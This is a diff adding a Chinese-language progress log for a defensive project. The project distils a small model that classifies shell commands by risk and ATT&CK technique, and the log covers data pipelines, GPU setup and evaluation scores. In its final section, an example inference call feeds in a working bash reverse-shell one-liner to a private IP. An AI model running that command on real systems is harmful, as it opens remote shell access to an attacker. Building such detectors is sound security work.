@@ -1,0 +1,179 @@
+# 进度记录
+
+## 已完成
+
+### Phase 1 — 数据地基 ✅（骨架 + schema）
+- `plan.md` — 架构定案（Frontier LLM → GLiClass Teacher → Tiny-GLiClass Student → INT8）
+- `label_schema.yaml` — 全链路 contract：risk 3 + intent 41 + tactic 14 + technique 141 = **199 labels**
+- `schema.py` / `schema_check.py` — 共享 loader + 校验（PASS）
+- 目录骨架：`data_pipeline/ dataset/ teacher/ student/ export/ redteam/ configs/`
+
+### 模型选型 ✅（Phase 1 数据生成的前置）
+- 网关：`ai-api-gateway.app.baizhi.cloud`，Key 在 `.key`（可用，39 个模型）
+- 结论见 `configs/model_selection.md`：
+  - 主力标注/生成：`gpt-5.6-sol`（质量/速度最优，支持 json_object）
+  - 快速批量合成：`qwen-flash`（最快最稳，~0.9–4s）
+  - 高难标注/红队备选：`deepseek-v4-pro`（推理强但慢）
+- 原始数据：`configs/model_bench.json` / `configs/model_bench_v2.json`
+
+### 数据管线核心模块 ✅
+- `data_pipeline/llm.py` — LLM client（重试、json_object、并发≤8）
+- `data_pipeline/normalize.py` — 自由输出 → canonical label 的确定性映射 + 校验
+- `data_pipeline/prompts.py` — 标注/合成/混淆/hard-neg/minimal-pair 的 prompt 构建
+- `data_pipeline/seeds.py` — 40 条种子命令（20 benign + 20 malicious）
+- `data_pipeline/label.py` — Stage 2 标注：40/40 标注成功 → `dataset/seed_labeled.parquet`
+  - risk 与 seed_risk 一致 33/40（7 条双用途命令被判为 suspicious，合理）
+
+## 关键发现
+1. 模型不保证输出 canonical id → 必须走 normalize + validate + 重试（已实现）
+2. 网关 24 并发会 502，`gpt-5.4-mini` 单独测也 502 → 客户端并发 ≤8 + 5xx 退避（已实现）
+3. `response_format={"type":"json_object"}` 可用，JSON 稳定性显著提升
+4. technique id 用大写 `T`（`technique.T1059.004`），normalize 需保留大小写（已修复）
+
+## 下一步（按依赖）
+1. **Stage 3 synthesize** — 用种子标签驱动 LLM 批量生成合成样本（qwen-flash 快速档）
+2. **Stage 4/5/6** — obfuscate / hard_neg / min_pair
+3. **Stage 7 export** — 分层 split + parquet 落盘（train/val/test）
+4. 数据量达标（600K~1M）后进入 Phase 2 Teacher fine-tune
+
+## Jev Teacher 接入 ✅（新增）
+
+- Key 保存到 `.jev_key`（chmod 600），端点 `https://api.typesafe.ai/v1/systemone`，模型 `jev-latest` → `jev-1.13.0`
+- `data_pipeline/jev_client.py` — Jev decisions 端点 client（重试 + 并发）
+- `data_pipeline/jev_labels.py` — 199-label schema → 197 题（1 Choice + 196 Noul）→ 199 维 soft 向量
+- `bench_jev.py` — Jev vs gpt-5.6-sol 对比（结果 `configs/jev_vs_gpt.json`）
+- `data_pipeline/label_jev.py` — 对种子批量出软标签
+  - `dataset/seed_soft_jev.parquet` — 40 条种子的 199 维 soft 向量（KD soft target）
+  - `dataset/seed_hard_jev.parquet` — 40 条种子的 hard labels
+
+## 结论
+- Teacher 软标签 + Stage 2 标注改用 **Jev**；数据生成/红队仍用 LLM。
+- Jev：197 题并行一次 ~1.2s，intent/tactic/technique 与 gpt-5.6-sol 持平，risk 略保守但一致率 33/40。
+
+## Phase 3 — Student 蒸馏最小闭环 ✅（本轮）
+
+- `student/tokenizer.py` — 8K 目标 BPE（当前语料 364 行 → vocab 1053，随数据量增长会自动逼近 8K）
+- `student/model.py` — TinySecurityEncoder（4L/256D/8H/FFN768/ctx192）+ bilinear label scoring（199 维）
+- `student/distill.py` — hard CE + soft KL（Jev 软目标）
+- `data_pipeline/build_dataset.py` — LLM 造候选（synthesize/obfuscate/hard_neg/min_pair）→ Jev 打软标签 → train/val/test
+- 产物：
+  - `dataset/soft_labels.parquet` — 226 条（train 182 / val 22 / test 22），199 维 soft + hard labels
+  - `student/checkpoints/student_best.pt` — 首个 Student checkpoint（3.00M params，vocab 1053）
+
+### 首轮蒸馏结果（182 训练样本，CPU）
+| 指标 | 值 |
+|---|---|
+| 训练 loss | 3.38 → 0.57（30 epochs） |
+| val micro-F1 | 0.458 |
+| **test risk_acc** | **0.727** |
+| **test micro-F1** | **0.623** |
+
+> 数据量只有 182 条，指标偏低属预期；关键是「LLM 造数据 → Jev 打软标签 → 小模型蒸馏」全链路已跑通。
+> 下一步把数据量提到几千/几万级，vocab 会涨到 ~8K、params 涨到 ~4.7M，指标会显著改善。
+
+### 后续（按优先级）
+1. 数据扩量：生成 + Jev 标注流水线并发化，把 226 → 5K+ → 50K+ → 600K~1M
+2. `export/quantize_int8.py` + RSS benchmark（Phase 4）
+3. `redteam/loop.py`（对抗闭环）
+
+## Lightning GPU 环境 ✅（已接入并验证）
+
+- 凭据存 `.lightning_env`（chmod 600，已 gitignore）：`LIGHTNING_USER_ID` / `LIGHTNING_API_KEY`
+- `pip install lightning-sdk`（2026.9.18.post1）；`lightning login` 成功 → 账号 **orangice1997**
+- 可用 GPU 机型：A100 / H100 / H200 / L4 / L40S / T4 / B200 …（`lightning machine list`）
+- 已有 Studio：`deepseek-ocr-table-finetune-devbox`（teamspace `orangice1997/deepseek-ocr-multidocument-analysis-project`，**L4，Running，当前空闲**）
+- 实测：
+  - `nvidia-smi` → NVIDIA L4，23034MiB VRAM，驱动 580.173.02，CUDA 13.0，0MiB 占用
+  - `torch 2.8.0+cu128`，`torch.cuda.is_available()=True`，device=NVIDIA L4 ✅
+- 注意：该 teamspace 是 user-owned，`lightning vm` 不可用（VM 需 org-owned）；训练用 **Studio** 或 **Job**。
+
+## 数据扩量到 50K — 进行中（卡在 Jev 余额）
+
+### 已完成
+- `data_pipeline/bulk_50k.py`：断点续跑的批量管线（generate / label / finalize）
+- 候选集 50,031 条 → `dataset/candidates_50k.jsonl`，来源：
+  - `quasarnix` 31,534（真实恶意，QuasarNix train 抽样）
+  - `nl2bash` 10,604（真实 benign，NL2Bash）
+  - `synthetic` 1,806 + `diverse` 6,087（LLM 生成，feature/flash）
+- Jev 软标签已完成 **24,800 条** → `dataset/soft_labels_50k.jsonl`（199 维，全部有效；其中 ~1,143 条因 402 失败为空标签，待重打）
+
+### 阻塞点 ⚠️
+- Jev API 返回 **HTTP 402 Payment Required**：
+  `Your organization has no available TypeSafe API credits.`
+- 需要去 `https://console.typesafe.ai/settings/billing` 充值或开启 auto-reload。
+- 恢复后一条命令续跑（已实现跳过已完成/仅重打空标签行）：
+  `python3 -m data_pipeline.bulk_50k label` → 完成后 `python3 -m data_pipeline.bulk_50k finalize`
+
+### 数据平衡（当前已标注部分）
+malicious 15,498 / suspicious 7,146 / benign 1,013（benign 偏低，因为 quasarnix 恶意占大头；下一轮补 benign/suspicious）
+
+## GLiClass 微调管线就绪（GPU 已验证）
+
+- `model/prepare_data.py` — 标签 → GLiClass 格式（true_labels + 负采样）
+- `model/finetune.py` — GLiClass 微调（distilbert-base-uncased，68.7M，hard CE + 可选 focal/contrastive）
+- `model/infer.py` — 评估（risk acc / micro-F1）+ demo
+- `export/quantize_int8.py` + `export/benchmark_rss.py` — INT8 + RSS
+- 依赖坑（已解决）：transformers 5.x 的 DeBERTa SentencePiece 有 bug → 降级 transformers 4.57.6 + gliclass --no-deps；encoder 改用 distilbert（WordPiece，68.7M，RSS 目标 <100MB）
+- Lightning L4 GPU 已切回 L4 并跑通 5-step 冒烟（CUDA 训练 3.7 it/s、eval 600 样本/s）
+
+### 数据进度
+- 原 50K 候选已全部 Jev 标注完成（label 进程结束，51,227 行含 1,143 重打）
+- 平衡数据生成中（suspicious + benign，当前 55K/80K 候选）
+
+## 最终模型 v0（已完成训练）
+
+- **模型**：GLiClass（distilbert-base-uncased，68.7M），`model/checkpoints_gpu/final_model/`（已下载到本地）
+- **数据**：74,748 条（Jev 软标签），train 62,792 / val 5,978 / test 5,978；risk 分布 ≈ mal 35% / benign 38% / suspicious 27%
+- **训练**：Lightning L4 GPU，3 epochs，batch 32，test_loss 0.094
+
+### 评估（GPU / torch 2.8，chunk=20 labels/forward）
+| 指标 | 值 |
+|---|---|
+| micro-F1（test 300，阈值 0.5） | 0.524（prec 0.39 / rec 0.80） |
+| risk acc（argmax） | 0.54 |
+| 训练期 test micro-F1（阈值未调优） | 0.925 / 0.889 |
+
+Demo 表现正常：`df -h`→benign、`systemctl restart nginx`→benign、reverse shell→suspicious + C2/T1059/execution。
+
+### 已知问题（后续优化）
+1. **阈值需调优**：当前 sigmoid@0.5 下精确率偏低（0.39）、召回高（0.80）→ 模型偏「多打标签」；可扫阈值或按类别加权。
+2. **风险偏向 suspicious**：双用途命令（curl|bash、reverse shell）被判 suspicious 而非 malicious，与 Jev 标注习惯一致。
+3. **本地 torch 2.14.0+cpu 有推理 bug**（输出 logits 近 0，微 F1=0）；**在 torch 2.8（GPU）上正常**。部署建议用 torch 2.8 / 导出 ONNX。
+4. `max_num_classes=25`：推理需把 199 标签按 ~20-25 一组分块打分（`final_infer.py` 已实现）。
+5. RSS 暂不限制（后期量化优化）。
+
+## 最终模型 v1（参数量 ≤30M 约束）
+
+- **模型**：GLiClass uni-encoder，encoder=google/electra-small-discriminator，**13.75M 参数**（≤30M ✅）
+  - 本地路径：`model/checkpoints_gpu/final_model_electra/`（model.safetensors 55MB）
+- **训练**：Lightning L4 GPU，4 epochs，batch 32，lr 5e-5，max_num_classes=50（修复了 v0 的 25-label 截断问题）
+- 数据：74,748 条 Jev 软标签，train 62,792 / val 5,978 / test 5,978
+
+### 最终评估（test 5,978，分块推理 + 分阈值）
+| 指标 | 值 |
+|---|---|
+| **OVERALL micro-F1** | **0.6575** |
+| risk micro-F1 | 0.7724 |
+| intent micro-F1 | 0.6883 |
+| tactic micro-F1 | 0.7370 |
+| technique micro-F1 | 0.4859 |
+| risk acc（exact） | 0.6256 |
+
+- 阈值已调优并落盘：`configs/thresholds.json`
+  - risk=-0.5 / intent=2.0 / tactic=2.75 / technique=2.0
+- 训练期 test micro-F1（单阈值口径）= 0.952
+
+### 备注
+- 本地 torch 2.14.0+cpu 推理仍有 bug（logits 归零），**用 torch 2.8（GPU）或导出 ONNX 部署**
+- 技术（technique，141 类）仍是最难的一组（F1 0.49），后续红队/更多数据重点攻这里
+
+## 本地推理就绪（修正）
+
+- **更正**：之前记录的「本地 torch 2.14 推理 bug」实为旧 distilbert checkpoint 的问题；最终 electra 模型在 **本地 torch 2.14 CPU 上推理正常**，无需 ONNX 也能本地用。
+- 新增 `model/predict.py` — 本地推理入口：
+  ```bash
+  python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+  # risk: risk.malicious / intent: execute,backdoor,C2 / technique: T1059,T1071,T1095
+  ```
+- 推理逻辑：199 标签按 20 一组分块打分，risk 用 argmax（互斥），intent/tactic/technique 用 `configs/thresholds.json` 分阈值。
+- ONNX 导出：已写 `export/export_onnx.py`，但 GPU 环境 pip 依赖被我调坏（numpy/scipy/sklearn 版本冲突），且本地 torch 已可用，**ONNX 暂缓**（后期量化时再做）。
